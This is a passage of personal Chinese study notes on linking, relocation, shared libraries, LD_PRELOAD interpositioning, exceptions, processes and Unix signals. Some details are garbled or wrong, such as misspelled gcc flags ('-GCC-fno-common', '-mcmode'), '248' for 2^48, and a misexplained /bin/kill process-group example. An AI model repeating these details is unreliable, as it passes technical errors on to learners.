因此应尽量避免命名使用全局变量，如果要用，也尽量在声明的时候赋予初始值，这样出现同名会及早抛出错误； 使用编译选项 -Werror 可以将警告转成错误，引起重视； 使用编译选项 -GCC-fno-common 会触发对多重定义的全局符号进行报错； 多个可重定位的目标文件可被打包成一个存档文件（即静态库）时，以 .a 为后缀；它有一个头部，用来描述每个成员文件的大小和位置； 当链接器使用静态库生成可执行文件时，它只会选择其中被应用程序引用的模块，而不会全部选择，这个机制非常重要，有如下好处： 它使得打包结果不会很大，而且不会每个程序都存在大量重复的内容，不必占用过多内存；以及库的改动不会影响现有程序，除非现有程序要用到库中新加入的函数，才需要重新编译； 程序员对库的引用的工作尽量少；因为引用一个库就可以包含很多内容，不必手工引用很多文件； ISO C99 中常用的静态库 libc.a 库中，包含以下常用函数：atoi, printf, scanf, stcpy, rand 等；不管是否显式声明，这个库在编译程序时，都是会隐式的发给链接器的； libm.a 库中，包含以下常用浮点函数，如 sin, cos, sqrt 等； 对静态库的引用有两种方式 绝对地址方式：gcc main.c &#x2F;usr&#x2F;lib&#x2F;libm.a &#x2F;usr&#x2F;lib&#x2F;libc.a 文件名+文件夹方式：gcc main.c -l c,m -L&#x2F;usr&#x2F;lib gcc -static 参数可以用来告诉编译器，要构造一个完全链接的可执行文件，可以直接加载到内存中运行 ，在加载时无须进一步的链接； 问：对动态库是否也适用？ 答：查了一下官方文档，貌似这个选项专用于共享库，原文为 “on systems that support dynamic linking, this prevents linking with the shared liabraries. On other systems, this option has no effect”; （待测试一下使用效果） 链接器的工作过程是这样的（这个过程害死了无数人）： 检查命令行中列出的文件，假设命令行为 gcc foo.c libx.a liby.a libz.a 如果发现有 .c 文件，先将所有 .c 的文件翻译成 .o 文件，确保最后只剩下 .o 文件和 .a 文件； 从左到右开始扫描，进行符号解析工作； 建立三个空的集合 E 文件集合：集合中的文件后续用来合并成可执行文件； U 符号集合：用来存放在当前目标文件中引用，但没有定义的符号； D 符号集合：用来存放 E 集合的文件中那些已经定义的符号； 从左到右依次扫描每一个文件，假设当前扫描到的文件为 f 如果 f 是一个目标文件 将 f 放入 E 集合中； 将 f 中定义的符号添加到 D 符号集合中 将 f 中引用却未定义的符号，添加到 U 符号集合中； 如果 f 是一个存档文件（即库文件，由一个或多个成员目标文件组成），假设第一个成员文件叫 m 匹配：检查 U 集合中未定义的符号是否在 m 的符号表中， 如果没有，抛弃 m，继续扫描 f 中的下一个成员文件； 如果有 将 m 加入 E 集合中； 将 m 中定义的符号添加到 D 符号集合中 将 m 中引用却未定义的符号，添加到 U 符号集合中； 重复：继续扫描 f 中的下一个成员文件，重复上一步的匹配过程，直到 U 和 D 都不再发生变化； 结果：所有在 f 中但却不包含在 E 集合中的成员目标文件，抛弃； 最后：当链接器扫描完所有的输入文件后 如果 U 非空，则抛出错误，表示存在未定义的引用，并终止； 如果 U 为空，则合并并重定位 E 集合中的文件，构建输出可执行文件； 库的引用规则 惯例：将库文件放在命令行的末尾，即在所有 .c 和 .o 文件的后面； 如果所有库之间相互独立，那么天下太平，回家睡觉； 如果所有库之间存在引用，那么需要排列这些库的顺序， 确保被引用的库排在引用者的后面； 如果二者相互引用，则重复输入库名，例如假设 foo 引用 x 库，x 库引用了y 库，y 库又引用了 x 库，即 foo -&gt; x -&gt; y -&gt; x gcc foo.c libx.a liby.a libx.a 重定位 重定位有两步 重定位节和符号定义 将各个模块中，相同类型的节，合并成一个同类型的大节（聚合节）； 问：合并的时候，如何确定顺序？ 答：貌似除了主函数所在的节需要放在前面，其他的位置貌似无所谓？只要分配好内存位置后，更新符号表即可？好奇当主函数执行完了以后，后续还有其他代码节怎么办？如何知道程序已经结束了？哦，想起来了，主函数的末尾强制有一个 return，它会导致跳出； 将运行时的内存地址，赋给聚合节、聚合节中的每个小节，以及小节中的每个符号；最后，程序中的每条指令和每个变量都将拥有唯一的运行时的内存地址； 重定位节中的符号引用 修改代码节和数据节中对符号的引用，使它们指向正确的运行时内存地址； 问：所谓的变量初始化赋值，在机器代码中是怎么一回事呢？最终结果貌似应该是某个内存地址，有一个值；估计这跟数据节里面的内容有关； 重定位条目 汇编器在生成目标模块时，并不知道模块引用的函数和数据将来在内存中的地址；但它会为它们生成一个重定位条目，指示后续的链接器，要为这些重定位条目中的函数和数据安排地址； 代码的重定位条目放在 .rel.text 节中 已初始化数据的重定位条目放在 .rel.data 节中； 重定位条目是一个 Elf64_Rela 结构，它有一个字段 type 用来标识重定位的类型，最基本的有两种 R_X86_64_PC32：它表示按程序计数器中的值，进行偏移重定位； 例如有个大的局部函数中，包含另外一个小的局部函数，则对小局部函数的引用，是否是相对大函数进行偏移？ R_X86_64_32：它表示按绝对地址进行重定位； gcc 默认使用 32 位寻址的重定位，这也意味着程序最大不能超过 2 GB；如果会超过，需要使用 -mcmode 选项告诉 gcc 新的寻址模式； 重定位符号引用列表 前提：每个节和每个符号已经被分配了地址； 步骤 遍历重定位条目表，对每一条重定位条目： 获取它的节偏移值，加上节地址，得到它的位置； 获取它的引用类型 如果是绝对引用，直接替换为符号的内存地址； 如果是按计数器引用，替换为符号的内存地址减去节地址，再减去节中的偏移地址； 完成遍历，结束； 总结：重定位是一个很有意思的过程；在合并生成可执行文件，可重定位的目标文件，并不知各个符号最终的内存地址；因此，对于每一处的符号引用，它先在重定位模块中为其生成一个条目；待有了最终运行时的地址后，它遍历这个条目列表，将每一处的符号引用，替换为正确的运行时地址； 可执行目标文件 可执行目标文件仍由各种节组成，大部分节跟可重定位目标文件一样 增加的新节：段头部表、init 节； 去掉的旧节：.rel.text, .rel.data，因为可执行目标文件是完全链接的，所以原来的引用表不再需要了； 为了让目标文件更快的加载到内存中，链接器在为目标文件生成虚拟内存地址的时候，会使用一定的对齐规则； 这也间接导致了目标文件中的各个节，不一定是连续的，中间可能因为对齐而产生一些缝隙； 另外为避免缓冲区溢出攻击，地址空间随机化也会产生空隙；不过这个空隙倒不是节之间的空隙，而是与起始位置的空隙； 加载可执行目标文件 加载：将程序复制到内存中 Linux 系统使用 execve 函数来调用加载器； 每个 Linux 程序都有一个运行时的虚拟内存镜像 代码段（只读代码段）总是从 0x400000 的位置开始；接下来是读&#x2F;写段，然后是堆 不同程序的堆的起始位置不是固定的，取决于它前面两个段的大小； 堆的地址是从低往高走的，那如何设置上限以避免溢出呢？答：按目前的了解，貌似没有上限，因此会存在堆溢出； 刚发现这个读写数据段和代码段分开很重要，因为这样可以实现让读写段私有，而代码段共享，从而能够实现共享库在多个进程间共享代码，节省内存； 内核内存总是从 248 的位置开始，往高处方向走； 栈总是从 248-1 的位置开始，然后从高往低走 貌似这样可以避免栈溢出对内核内存部分带来的破坏？ 在加载过程中，没有任何实际从磁盘到内存的数据复制，而只是做好了映射的工作，一直要等到 CPU 调用一个被映射的虚拟页面时，才会启动复制工作； 貌似这个机制在 CPU 和 GPU 的协同计算时，也是这么用的 动态链接共享库 共享库在使用的时候，可以被加载到任意的内存位置，然后跟内存中的程序链接起来，链接的工作由动态链接器来完成； 两种不同的共享方式 在文件系统中，一个共享库只有一个 .so 文件，所有引用该库的程序，共享这个文件； 在内存中，一个共享库的 .text 节的一个副本，可以被不同的运行中的进程共享；（这种共享方式貌似有点奇怪？） 使用动态库时，在生成程序的可执行文件时，并不会复制一份共享库的代码，而只会复制它的一些重定位和符号表信息，以便在动态加载时，可以解析对动态库的引用； 可执行文件中会增加一个 interp 节，它包含动态链接器的路径名（因为动态链接器本身也是一个共享库） 如果加载器发现可执行文件包含共享库，则会按其中保存的路径名调用动态链接器，之后动态链接器完成以下工作 重定位共享库文件和数据到某个虚拟内存段；（相当于将共享库的代码和数据与内存中的代码和数据映射关联起来） 重定位程序中所有由共享库定义的符号的引用；（在上一步的工作完成后，得到了共享库的当前正确地址，根据这个地址，重新定位原执行文件中的引用符号的地址） 从应用程序中加载和链接共享库 共享库的两个有用场景 软件分发：共享库得软件更新变得轻量和简单，每次只需更新局部的共享库即可，对用户更加友好； 高性能的 Web 服务器：将一些动态功能做成共享库，在响应请求的时候，按需调用；避免使用子进程的开销； 感觉现在由于前后端分享，貌似这种用法也不多了； 不过另外一个好处是不需要停止服务器，即可以完成功能更新，实现热部署，这点倒是不错哦； Linux 系统还提供了一组函数，用来实现在代码中使用动态链接器加载共享库；定义在头文件 &lt;dlfcn.h&gt; 中 dlopen, dlsym, dlclose, dlerror； 注意如果要使用以上四个函数，编译的时候需要加上 -rdynamic 选项，以及添加共享库 -ldl 示例：gcc -rdynamic -o prog prog.c -ldl Java 通过 JNI 接口实现跟 C 或 C++ 代码的对接；它的原理是将 C 代码编译成共享库，然后使用系统中 &lt;dlfcn.h&gt; 提供的函数，实现对共享库的调用； 估计 Python 也是使用相同的方法来实现对接工作； 位置无关的代码 为了让多个进程共享一份共享库代码，需要共享库加载到内存中时，是位置无关的，这样可以避免内存管理的难题； 通过 -fPIC 选项显式要求 GNU 编译器将源文件编译为位置无关的代码； PIC：position independent code； PIC 数据引用 原理：在数据段开始的地方，增加一个 GOT 全局偏移量表（每个条目8字节），对于每个被引用的全局数据变量，在这个表中增加一个相应的条目；编译时，由于代码段跟数据段的距离是固定的，所以代码段中引用全局变量的地方，设置为对应的条目的偏移量地址，然后这个条目对应的全局地址是空的，等到实际加载时，由动态链接器往各条目写入全局绝对地址，这样代码段就可以间接引用到这个全局地址了； PIC 函数调用 函数调用使用了和数据引用不太一样的机制：延迟绑定技术(lazy binding)，除了原来的 GOT，又增加了一个 PLT（过程链接表，procedure linkage table，每个条目16字节） 这个技术很有意思，也有点小复杂，过程是这样的 首次调用库函数时，调用动态链接器，获得库函数的全局地址，然后存放在 GOT 表中，然后引用库函数； 再次调用库函数时，直接在 GOT 表中得到之前存放的库函数全局地址，直接引用库函数； 库打桩机制 不知道为什么叫做库打桩这个名称，它其实就是对某个库函数做一个包装函数，让程序在调用这个库函数时，实际调用的是包装函数，这样我们就可以在包装函数内部做一些我们想实现的事情，同时也不影响库函数的正常使用；这种方式可以给调试带来很大的便利； 这个很有可能就是 valgrind 内存跟踪的实现机制； 打桩可以发生在各个阶段，比如编译时、链接时、加载时、运行时等； 编译时打桩 在头文件中定义宏来实现函数替换； gcc -DCOMPILETIME -c mymalloc.c 增加编译选项 -DCOMPILETIME 编译可重定位目标文件； gcc -I. -o intc int.c mymalloc.o 通过 -I 选项指定头文件的搜索位置，这样编译器就会优先使用本地的同名头文件进行编译，而不是标准位置的头文件； 链接时打桩 gcc -DLINKTIME -c mymalloc.c 增加编译选项 -DLINKTIME编译可重定位目标文件； gcc -c int.c gcc -Wl,–wrap, malloc -Wl,–wrap,free -o intl int.o mymalloc.o 使用 -Wl 选项来告知编译器对某些函数进行替换（起到了宏的效果） 运行时打桩 原理：动态链接器在解析共享库之前，会检查环境变量 LD_PRELOAD 的值，如果有值，会先根据其中的路径列表，优先解析和加载里面的动态库的函数； 优点：编译和链接时打桩，需要有源代码文件或者目标文件，运行时打桩，则只需要知道函数名称即可； 过程 gcc -DRUNTIME -shared -fPIC -o mymalloc.so mymalloc.c -ldl 构建含有包装函数的共享库 gcc -o intr int.c 编译主程序； LD_PRELOAD&#x3D;”.&#x2F;mymalloc.so” .&#x2F;intr 运行主程序时指定环境 LD_PRELOAD 的值为包含包装函数共享库 LD_PRELOAD 可以用来对任何可执行程序调用的库函数进行打桩； 处理目标文件的工具 GNU binutils 工具包里面的有很多工具可以用来处理目标文件，了解关于目标文件的更多信息； AR：静态库处理工具，包括打包、提取、插入、删除成员文件等； STRINGS：列出目标文件中可打印的字符串； STRIP：删除目标文件中的符号表； NM: 列出目标文件符号表中的符号； SIZE：列出目标文件中节的大小和名字； READELF：显示目标文件的结构； OBJDUMP：显示一个目标文件的所有信息；可以用来反汇编 .text 节中的二进制指令； LDD：列出目标文件所有用到的共享库名称； 异常控制流 异常 从当前指令到下一条指令的过渡，称为控制转移；一系列的控制转移，组成控制流；系统除了对程序内部的状态变化做出反应外，还需要对系统状态的变化做出反应；系统通过使控制流发生突变来对系统状态变化做出反应，这种系统突变称之为异常控制流（EFC，Exceptional Control Flow）； ECF 是系统用来实现 I&#x2F;O、进程和虚拟内存的基本机制； 应用程序通过使用一个叫做陷阱(trap)或者系统调用(system call)的 ECF 异常控制流形式，来向操作系统申请服务； ECF 是实现并发的基本机制；实现并发的三种机制（进程、线程、I&#x2F;O 多路复用）都跟 ECF 有关； 非本地跳转：规避通常的调用&#x2F;返回栈规则的跳转方式；非本地跳转是一种应用层的 ECF；在 C 语言中可使用 setjmp 和 longjmp 函数来实现；其原理是先预保存环境在系统缓存中，然后在条件满足的时候，触发跳转到这个保存在缓存中的环境； 进程和信号位于应用和操作系统的交界之处；异常则位于硬件和操作系统的交界之处； 异常是异常控制流(ECF)的一种形式，它一部分由硬件实现，一部分由操作系统实现； 异常是控制流中的突变，用来响应处理器状态中的某些变化； 状态变化被称为事件； 在任何情况下，当处理器检测到有事件发生时，它就会通过一张叫做异常表(exception table)的跳转清单，进行一个间接过程调用(异常)，到一个专门设计用来处理这类事件的操作系统子程序(异常处理程序 exception handler)；当异常处理程序完成处理后，根据引起异常事件的类型，会发生以下三种情况中的一种 处理程序将控制返回给中断时的当前指令 Icurr 处理程序将控制返回给中断时的下一条指令 Inext 处理程序终止被中断的程序； 异常处理 系统中每种可能发生的异常都分配了一个非负整数的异常号(exception number)； 处理器设计者分配的异常：除零、缺页、内存访问违例、断点、算术运算溢出等； 操作系统内核设计者分配的异常：系统调用、来自外部 I&#x2F;O 设备的信号等； 异常表：表目 k 包含异常 k 的处理程序的地址；异常表的起始地址放在异常表基址寄存器中； 异常处理类似于普通的过程调用，但也有不同之处，包括 返回地址不确定：可能是返回被中断程序的当前指令，也可能是下一条指令； 它会将额外的处理器状态压入到栈中 当控制从用户程序转移到内核时，压入内核栈而非用户栈； 对资源具有完全的访问权限：因为它运行在内核模式下； 异常的类别 中断 interrupt 中断不是由处理器内部的任何一条指令触发的，而是来自处理器外部的 I&#x2F;O 设备信号的结果；从这个意义上来说，它是异步的，即它不是执行当前指令的结果，其他三种类型的异常都是同步发生的，因此它们属于故障指令 faulting instruction； 过程： I&#x2F;O 设备向处理器芯片的一个引脚发信号，并将异常号放到系统总线上，来触发中断，异常号则用来标识引起中断的设备； 在当前指令处理完成后，处理器注意到中断引脚的电压变高，就从系统总线中读取异常号，然后调用对应的中断处理程序； 当中断处理程序返回时，处理器将控制返回给下一条指令，原被中断的程序继续运行； 陷阱 trap 和系统调用 陷阱是有意的异常，是执行一条指令的结果；陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，称为系统调用； 用户程序经常需要向内核请求各种服务，因此处理器设计了一条 syscall n 的特殊指令，用户程序可以通过这条指令请求服务 n； 执行 syscall 指令会生成一个到异常处理程序的陷阱，这个程序解析参数，并调用适当的内核程序； 故障 fault 故障由错误情况引起，即执行当前指令的时候，发生了一个故障；此时控制传递给故障处理程序，若程序能够修复故障，则将控制返回给原触发故障的指令，重新执行指令；若不能修复，则返回控制到内核中的 abort 例程，它会终止引起故障的应用程序； 经典的故障示例是缺页异常； 对于缺页异常，貌似它的故障指令应该是由处理器发出的，因为处理器在收到程序的读取某个虚拟内存地址的指令时，会发现源操作数的标记位为未缓存，然后触发异常； 终止 abort 终止是不可恢复的致使错误造成的结果，通常是一些硬件错误；终止处理程序从不会将控制返回给应用程序； Linux&#x2F;x86-64 系统中的异常 虽然在 C 语言中，通过 syscall 函数可以进行系统调用，但实际更多是使用 C 标准库中提供的包装函数进行调用，这些包装函数以及被包装的系统调用在本书中统称为系统级函数； 所有到 Linux 系统调用的参数都是使用通用寄存器来传递的，而不是通过栈传递； 进程 进程的经典定义就是一个执行中程序的实例；系统中的每个程序都运行在某个进程的上下文中； 上下文是由各种状态组成的，包括内存中的代码和数据、栈、通用寄存器中的内容、程序计数器、环境变量，以及打开文件描述符的集合； 逻辑控制流 进程为每个程序提供了一种逻辑流的抽象，让程序感觉自己好像在独占处理器，而不是将处理器的物理控制流暴露给应用程序； 每个进程执行它的流的一部分，然后被抢占（preempted，暂时挂起），然后轮到其他进程； 抢占的机制是什么？一般由系统内核来控制，它自己会有周期性的中断机制，然后进行调度； 并发流 一个逻辑流在执行时间上与另一个流重叠，称为并发流(concurrent flow)； 一个进程与其他进程轮流运行的概念称为多任务(multitasking)； 一个进程执行它的控制流的一部分的每一时间段称为时间片(time slice)；因此，多任务也叫做时间分片(time slicing)； 多个流并发执行的现象称为并发(concurrency)； 如果两个流并发的运行在不同的处理器核或者计算机上，那么称它们为并行流(parallel flow)； 并发流的概念跟处理器内核数或者计算机台数无关，只要两个进程的执行时间有重叠，就可以称它们为并发流； 私有地址空间 地址空间组成，从低处的 0x00400000 开始到高分别为 只读代码段：.init, .text, .rodata 读&#x2F;写段：.data, .bss 运行时堆：堆顶指针 brk 共享库的内存映射区域 运行时栈：栈顶指针 %esp 内核虚拟内存：代码、数据、堆、栈；此部分对应用程序的代码不可见 用户模式和内核模式 处理器通过“控制寄存器”的模式位限制了应用程序的进程可以访问的地址空间范围以及可以执行的指令； 当未设置控制位时，进程运行在用户模式下，应用程序必须通过系统调用的接口，来间接的访问内核代码和数据，否则会触发保护故障； 之前一直好奇异常处理程序的指令存在哪里，突然想到有可能如下：一开始它们是由操作系统携带进来的，在加载操作系统后，从磁盘复制到了内存中；然后在开启一个新的进程时，进程中的虚拟内存的内核段就会映射物理内存中的异常处理程序； 当设置了控制位后，进程就会运行在内核模式下（也即超级用户模式），此时进程可以访问任意的内存位置，并可以执行指令集中的任何指令； 进程初始运行在用户模式下，要从用户模式变成内核模式的唯一办法是通过异常机制，即中断、陷阱或故障，此时控制会转移到异常处理程序，然后处理器将模式转变为内核模式，以便异常处理程序运行在内核模式下；当需要将控制返回给应用程序时，处理器再把模式切换回用户模式； Linux 系统通过 &#x2F;proc 文件系统，允许用户模式下的进程访问内核数据结构中的内容； &#x2F;proc 文件系统将内核数据结构输出为一个可以读的文本文件的层次结构；2.6 之后版本的 Linux 还引入了 &#x2F;sys 文件系统，它输出系统总线和设备的额外的低层信息； 上下文切换 上下文是内核重新启动一个被抢占进程所需要的状态，它由一些对象的值组成，这些对象包括通用目的寄存器、浮点寄存器、程序计数器、状态寄存器、内核栈、用户栈，以及各种内核数据结构（如包含虚拟地址映射信息的页表、包含有关当前进程信息的进程表、包含已打开文件信息的文件表）； 调度：内核决定抢占某个正在运行的进程，并重新开始一个之前运行的进程；由内核代码中的调度器来完成这个动作 调度三板斧：保存、恢复、转移控制； 每个进程都有自己的虚拟内存，因此两个不同进程很可能会使用某一个相同的虚拟内存地址，当 CPU 收到某条指令操作某个虚拟内存地址时，它完全不知道应该映射到哪个物理内存地址，但是，通过为每个进程创建一张单独的映射物理内存的页表，就可以实现正确的地址翻译；因为，需要使用一个页表寄存器，来表明当前应该使用哪一张页表进行翻译工作；所以，对于调度来说，除了修改程序计数器外，还需要修改页表寄存器，才能真正的完成控制转移的工作； 所有的系统都有周期性的中断机制，例如1毫秒或10毫秒；内核根据周期性的中断信号，可以判断当前进程已经进行到足够长的时间，然后它就会强制进行切换； 由于异常处理程序是运行在内核模式下的，所以整个调度的过程，实际是反复在用户模式和内核模式之间切换； 从一个进程到另外一个进程的切换发生在内核模式的运行期间； 当某个应用程序进程 A 进行系统调用发生阻塞时，内核会让其进入休眠，并切换到其他进程 B 进行处理；直到阻塞的工作已经完成并发出中断信号后，此时如果内核判断 B 进程已经运行了足够长的时间，它将切换回 A 进程； 系统调用错误处理 对函数调用是否出错进行检查是良好的编程习惯，它有助于在第一时间暴露问题，减少调试的时间； 有两种处理错误的方法 方法一：使用宏，简化错误检查的代码行数，例如 Shaw 关于调式宏的做法； 方法二：使用错误包装处理函数，编写一个大写字母开头的同名函数，增加错误检查代码；这样在函数调用的地方，改用包装函数，将使得代码更加简洁（此方法推荐使用） 进程控制 获取进程 ID #include &lt;sys&#x2F;types.h&gt; #include &lt;unistd.h&gt; pid_t getpid(void); &#x2F;&#x2F; 获取当前进程的 pid pid_t getppid(void); &#x2F;&#x2F; 获取当前进程的父进程的 pid 创建和终止进程 进程仅有三种状态 运行：正在执行，或者等待调度后执行； 暂停：被挂起，直到收到信号后才会开始执行，不会被调度； 终止：永远停止了； 终止进程的三种办法 收到终止进程的信号 从主程序 main 中返回； 调用 exit 函数终止 #include &lt;stdlib.h&gt; void exit(int status); 通过调用 fork 函数可以用来创建子进程 #include &lt;sys&#x2F;types.h&gt; #include &lt;unistd.h&gt; pid_t fork(void); fork 是一个非常特别的函数，它被调用一次，却会返回两次，原因在于，当它被调用时，子进程会复制一份父进程的地址空间，因此这个时候同一个返回值变量 pid，产生了两个分身，一个在父进程中，一个在子进程中；父进程中 pid 变量的值为子进程的真正的 pid 号，子进程的 pid 号为 0； 因此，可以通过判断 pid 变量是否为0，来有选择的执行那些需要在子进程中执行的代码； 当程序中有多个 fork 时，要特别小心；子进程的创建将可能出现指数变化，而不是线性变化； 父子进程是并发进行的独立进程，所以它们各自的代码的执行顺序是不确定的； 父子进程拥有相同但独立的地址空间； 父子进程之间共享文件符描述表，因此可以对同一份文件进行操作； 回收子进程 当一个进程终止时，它只是变成了终止的状态，但并没有马上被回收和清除；要一直等到它的父进程对它进行回收时，它才会彻底的消失；在未回收前，该进程称为僵死进程； 在系统启动时，会创建一个 pid 为 1 的 init 进程，它是所有进程的祖先；如果一个父进程终止时，没有回收它自己的子进程，那么内核会安排 init 进程回收子进程； 如果子进程仍在运行，则子进程会变成一个后台守护进程（daemon）（搞不好创建守护进程的方法，就是通过一个父进程创建它，然后杀死这个父进程，使新创建的进程变成孤儿进程，这个时候它就会是一个守护进程了？） 一个进程可以通过调用 waitpid 函数来等待它的子进程终止或停止； #include &lt;sys&#x2F;types.h&gt; #include &lt;sys&#x2F;wait.h&gt; pid_t waitpid(pid_t pid, int *statusp, int options); 参数 pid：用来设置等待集合，当 pid &gt; 0 时，等待集合只有一个指定的子进程，它 进程 ID 为 pid；当 pid &#x3D; -1 时，等待集合是父进程创建的所有子进程； 参数 statusp：用来存放导致子进程中止的各种状态信息； 参数 options：设置等待的行为特征，例如不同的等待方式；支持位组合 默认情况下（当 options &#x3D; 0时），waitpid 会挂起调用者进程的执行，直到它的等待集合(wait set) 中的一个子进程终止。如果等待集合中的一个进程在调用时即已经终止了，则 waitpid 将马上返回；不管哪种情况，当 waitpid 返回的时候，它都会返回那个导致它返回的进程的 PID 值；此时，终止的子进程已经被回收并被内核清除； 如果调用进程没有子进程，或者 waitpid 函数被某个信号中断，则会返回 -1，并设置 errno 为 ECHILD 或 EINTR； pid_t wait(int *statusp) 是简化版，等同于 waitpid(-1, &amp;status, 0); 当父进程有多个子进程时，可以通过指定对应的子进程 PID 来进行有顺序控制的等待； 让进程休眠 #include &lt;unistd.h&gt; unsigned int sleep(unsigned int secs); &#x2F;&#x2F; 将进程挂起一段指定的时间；当时间到了后，它会返回 0；如果 sleep 函数被某个信号中断导致过早返回，则它返回的不是 0，而是剩余时间； int pause(void); &#x2F;&#x2F; 让调用进程进入休眠状态，直到收到信号后再重新启动； 加载并运行进程 #include &lt;unistd.h&gt; int execve(const char *filename, const char *argv[ ], const char *envp[ ]); filename: 可执行目标文件的路径 argv: 指向参数字符串的数组指针； envp: 指向环境变量字符串的数据指针； 调用 fork 时，会创建一个子进程，并返回两次； 调用 execve 时，则直接对原进程虚拟地址空间中的用户数据进行覆盖，但会继承原来的文件描述符，除非调用出错，不然它不会返回任何结果； 调用 execve 时，它会调用执行操作系统内核中提供的加载器代码，将可执行文件的代码节和数据节从磁盘复制到内存中，并将控制转移到代码节的入口点（即主函数 main），开始执行里面的指令； 主函数：int main(int argc, char *argv[ ], char *envp[ ]); 当一个新程序开始时，用户栈的典型组织如下，从栈底开始往栈顶方向： 以 null 结尾的环境变量字符串； 以 null 结尾的参数变量字符串； 以 NULL 结尾的环境变量指针数组； 以 NULL 结尾的参数变量指针数组； libc_start_main 的栈桢； main 的未来的栈桢； argc, argv, envp 三者的值分别存储在寄存器 %rdi, %rsi, $rdx 中；它们指向以上栈中相应的位置； 操作环境变量的函数 #include &lt;stdlib.h&gt; char *getenv(const char *name); 用来搜索查询环境变量 name 的值，若没有找到，则返回 NULL； 这里特别有意思的是，环境变量的键值对是一起存储的，它们以等号 &#x3D; 分隔，即存成 “name&#x3D;value” 的形式； int setenv(const char *name, const char *newvalue, int overwrite); &#x2F;&#x2F; 用来替换旧值，若旧值不存在，则直接创建新值； void unsetenv(const char *name); &#x2F;&#x2F; 用来删除环境变量； 程序与进程的区别 程序只是一堆代码和数据，它们通常存储于磁盘中，在运行前会加载到内存中； 进程是进行中的程序的一个实例，程序总是需要运行某个进程的上下文中； 利用 fork 和 execve 运行程序 shell 的基本工作原理即是使用 fork 和 execve 来运行程序； 过程： 等待用户输入命令行 解析命令行，判断为内置命令或要求调用可执行文件，判断前台运行（等待子进程结束）或后台运行（不等待） 使用 fork + execve 在子进程中运行相应的程序； 信号 异常是由硬件和内核共同处理的，其中有部分对用户进程是不可见的；Linux 信号则通过软件的形式，提高了一种更高层次的抽象的异常机制，它是一条小消息，用来通知进程系统发生了某个事件； 每种信号类型都对应某种系统事件，借助信号机制，进程和内核之间，进程与进程之间可以实现相互通信； 信号术语 发送信号：内核通过更新目的进程上下文中的某个状态变量值，来给进程发送一个信号； 接收信号：当目的进程对信号做出反应时，它就接收了信号； 待处理信号：当信号发出后，但未被接收前的状态； 同一种类型的信号，最多只会有一个待处理的信号，后续发过来的同种类型的信号，会被丢弃，不会进入待处理； 一个进程可以有选择的对某种信号进行阻塞，当阻塞时，信号仍然可以发出，但不会被接收，直到取消阻塞为止； 所谓的不会被接收，或许只是相当于进程不对信号做出反应？ 一个待处理信号最多只会被接收一次；内核通过一个位向量来维护待处理信号和阻塞信号的集合； 当信号被接收后，估计进程会对信号位向量进行重置更新； 发送信号 每个进程都属于一个进程组；它用一个正整数的 ID 来标识 #include &lt;unistd.h&gt; pid_t getpgrp(void); &#x2F;&#x2F; 用来获取当前进程的进程组 ID； pid_t setpgid(pid_t pid, pid_t pgid); &#x2F;&#x2F; 用来设置某个进程所属的进程组ID； &#x2F;bin&#x2F;kill 程序可以用来向另外的进程发送任意的信号 示例1：linux&gt; &#x2F;bin&#x2F;kill 9 15213 &#x2F;&#x2F; 表示给进程 15213 发送信号 9 示例2：linux&gt; &#x2F;bin&#x2F;kill -9 15213 &#x2F;&#x2F; 此处信号使用负数，它表示给进程组 15213 发送信号 9 用键盘发送信号 在 Unix Shell 中，在对命令行进行求值时，shell 会为其创建进程，不过在 shell 中是以作业(job) 的概念来表示进程； 在键盘上输入 CTRL + C 或者 CTRL + Z 会发送相应的信号给 shell 前台进程组中的每个成员； 用 kill 函数发送信号 #include &lt;sys&#x2F;types.h&gt; #include &lt;signal.h&gt; int kill(pid_t pid, int sig); 进程可以通过调用 kill 函数来给其他进程或者自己发送信号； 用 alarm 函数发送信号 #include &lt;unistd.h&gt; unsigned int alarm(unsigned int secs); alarm 函数只能用来给自己发送 SIGALRM 信号；如果调用时，前面有闹钟未到点，之前的闹钟会被清除，并会返回之前闹钟的剩余时间；如果前面没有未到点的闹钟，则会返回0; 接收信号 当内核将进程 p 从内核模式切换到用户模式时，内核会检查进程的待处理且未阻塞的信号集合，如果非空，则一般会选择最小的那个信号发给进程 p，并强制其接收；进程收到信号后会触发某种处理行为，处理完成后，控制转移到原 p 进程中待处理的下一条指令； 每个信号类型有一个预定的默认行为，下面四种之一 终止进程 终止进程并转储内存 挂起进程等待 SIGCONT 信号后重启； 忽略信号 调用 signal 函数可以为信号设置不同的处理程序 #include &lt;signal.h&gt; typedef void (*sighandler_t)(int); sighandler_t signal(int signum, sighandler_t handler); 若 handler 为 SIG_IGN 则表示忽略信号；若为 SIG_DFL 则表示使用默认行为；否则应为用户自定义的信息处理程序； 同一个信号处理程序，可以用来处理多个不同类型的信号； 信号处理程序可以被其他信号中断，中断行为同主程序，逐级向下转移，处理好了后，再逐级向上转移； 可以在处理前，先暂时阻塞所有信号，待处理后，再进行恢复，这样就可以避免信号处理程序被中断； 调用信号处理程序即“捕获信号”；执行信号处理程序即“处理信号”； 阻塞和解除阻塞信号 隐式阻塞机制：如果信号处理程序正在处理某个信号类型，则当收到新的同类型信号 b 时，内核是默认阻塞的，会将 b 放入待处理信号的集合；如果此时再有同类型的 c 信号进来，因为已经有 b 在待处理集合中，c 信号会被简单丢弃； 显式阻塞机制；应用程序使用 sigprocmask 函数和它的辅助函数，明确的阻塞和解除阻塞选定的信号； 编写信号处理程序 挑战 由于信号处理程序与主程序以及其他信号处理程序共享全局变量且并发运行，因此不可避免存在相互干扰的问题； 如何接收信号、何时接收信号的规则常常有违人的直觉； 不同的系统有不同的信号处理语义； 安全的信号处理原则 处理程序要尽可能简单；例如只是简单设置标志位并立即返回；所有与接收信号相关的处理都由主程序执行； 在信号处理程序中只调用异步信号安全的函数，即要么这个函数是可重入的（只使用局部变量），要么它不能被信号处理程序中断； 保存和恢复 errno：如果处理程序要返回，则在进入处理程序后，用一个局部变量保存 errno，然后在返回的时候恢复它；如果处理程序不返回，则不需要这么做； 原因：在调用异步信号安全的函数时，它们在出错时可能会设置 errno；因此，通过恢复机制，可避免处理程序干扰主程序中依赖于 errno 的代码 阻塞所有的信号，保护对共享全局数据结构的访问：当主程序和信号处理程序有共享全局数据结构时，则在访问该数据结构时，应暂时阻塞所有的信号，以便在读取一半的时候，数据不小心被修改了； 貌似也可以通过红绿灯检查的机制，来实现访问加锁； 用 volatile 声明全局变量：用来告诉编译器不要缓存这个变量，避免某个全局变量被编译器优化成缓存了，导致读取不到该变量的更新值； 用 sig_atomic_t 类型来声明标志：由 C 